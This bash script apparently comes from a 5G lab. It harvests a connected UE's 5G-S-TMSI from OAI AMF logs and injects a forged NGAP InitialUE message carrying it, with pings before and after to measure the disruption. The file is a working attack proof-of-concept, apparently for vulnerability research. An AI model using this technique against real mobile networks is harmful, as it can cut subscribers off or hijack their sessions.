#!/usr/bin/env bash
# OAI: InitialUE with victim 5G-S-TMSI while CM-CONNECTED
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
ABS="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT"
AMF=oai-amf; UE=ueransim-oai-ueransim-ue-1; NET=net-5glab
# Parse from latest AMF log: "Allocated GUTI ... (TMSI <dec>)"
TMSI_DEC=$(docker logs "$AMF" 2>&1 | grep -oE 'TMSI [0-9]+' | tail -1 | grep -oE '[0-9]+')
TMSI=$(printf '%08x' "$TMSI_DEC")
# OAI config.yaml for PLMN 001/01: amf_set_id 001 -> 1, amf_pointer 01 -> 1
SET=1; PTR=1
PING0=$(docker exec "$UE" ping -I uesimtun0 -c 3 -W 2 8.8.8.8 2>/dev/null | grep -oE '[0-9]+% packet loss' | head -1)
echo "BEFORE: TMSI_dec=$TMSI_DEC TMSI_hex=$TMSI set=$SET ptr=$PTR ping=$PING0"
MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
MSYS_NO_PATHCONV=1 docker run --rm --network "$NET" -v "$ABS:/evidence" ngap-tester \
  --config config/oai.json --evidence /evidence/attack.jsonl \
  initial-ue --ran-ue-id 99 --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI" 2>&1 | sed 's/^/  /'
sleep 3
echo "--- AMF markers ---"
docker logs "$AMF" 2>&1 | tail -n +"$((MARK+1))" | grep -iE 'Initial UE|5g_s_tmsi|GUTI|amf_ue_ngap|ran_ue_ngap|Old AMF|New AMF|Existing nas|Create a new|error|Error|reject|Reject|Service' | sed 's/^/  /' | tail -40
PING1=$(docker exec "$UE" ping -I uesimtun0 -c 5 -W 2 8.8.8.8 2>/dev/null | grep -oE '[0-9]+% packet loss' | head -1)
echo "AFTER ping=$PING1"
